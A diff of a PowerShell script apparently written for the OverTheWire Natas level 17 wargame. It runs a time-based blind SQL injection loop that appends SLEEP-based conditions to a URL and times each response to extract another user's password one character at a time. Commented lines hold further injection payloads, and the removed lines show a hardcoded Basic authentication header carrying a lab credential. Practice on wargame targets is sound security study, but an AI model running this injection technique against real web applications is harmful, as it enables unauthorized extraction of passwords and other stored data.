@@ -1,34 +1,26 @@
-$url = "http://natas17.natas.labs.overthewire.org/?debug"    
-$authorization = "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQwo="
-
-$headers = @{
-    "Authorization" = $authorization
-    #"Content-Type"  = "application/x-www-form-urlencoded"
-}
-
 $lowercaseChars = 97..122 | ForEach-Object { [char]$_ }
 $uppercaseChars = 65..90 | ForEach-Object { [char]$_ }
 $numbers = 48..57 | ForEach-Object { [char]$_ }
 
 $all_characters = $lowercaseChars + $uppercaseChars + $numbers
 
-function Send_Command {
-    param (
-        [string]$command
-    )
-    if ($command) {
-            $response = 
-            if (!$response) {
-                Write-Host "Error!"
-                exit
-            }
-        return $response
-    }
+$url = "http://natas17.natas.labs.overthewire.org/?debug"
+
+$username = "natas17"
+$password = "***REMOVED***"
+
+$pair = "${username}:${password}"
+$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
+$base64 = [System.Convert]::ToBase64String($bytes)
+$authorization = "Basic $base64"
+
+$headers = @{
+    "Authorization" = $authorization
+    "Content-Type"  = "application/x-www-form-urlencoded"
 }
 
-$FileName = '/etc/natas_webpass/natas17'
 $result = ""
-for ($position = 1; $position -le 32; $position ++) {    
+<#for ($position = 1; $position -le 32; $position ++) {    
     
     foreach ($char in $all_characters) {  	 
 
@@ -44,6 +36,46 @@ for ($position = 1; $position -le 32; $position ++) {
                 }
             }
         }
+    }
+}#>
+
+
+# SELECT * from users where username="
+#" OR IF(SUBSTRING(username, 1, 1) = 'a', SLEEP(5), 0)--
+
+<#
+    $char = SUBSTRING(username, 1, 1)
+    '" OR IF(SUBSTRING(' + $position + ', 1) = "'+$char+'", SLEEP(2), 0)--%20'
+
+    
+    '" OR (username = "natas18" and IF(SUBSTRING(password, ' + $position + ', 1) = "natas18", SLEEP(2), 0)-- -
+
+#>
+
+#'" OR IF(SUBSTRING(username, 1, 1) = "n", SLEEP(2), 0)-- -'
+$url += "&username=natas18"
+$result = ""
+for ($position = 1; $position -le 32; $position ++) {    
+    Write-Host "`nPosition: $position"
+    foreach ($char in $all_characters) {  	 
+        #3:
+        #just do Send-Command -command $command -char $character
+        
+        $cmdURL = $url + '" and IF(BINARY SUBSTRING(password, ' + $position + ', 1) = "' + $char + '", SLEEP(5), 0)-- -'
+        $start = Get-Date
+        $response = Invoke-WebRequest -URI $cmdURL -Headers $headers -Method 'GET' -UseBasicParsing 
+        $end = Get-Date
+        if ($response) {
+            if (($end - $start).TotalMilliseconds -ge 5000) {
+                Write-Host "--- It is: Char $char"
+                $result += $char
+                break
+            }
+        }
+    }
+    if (!$result) {
+        write-host "got nothing"
+        exit
     }
 }
 
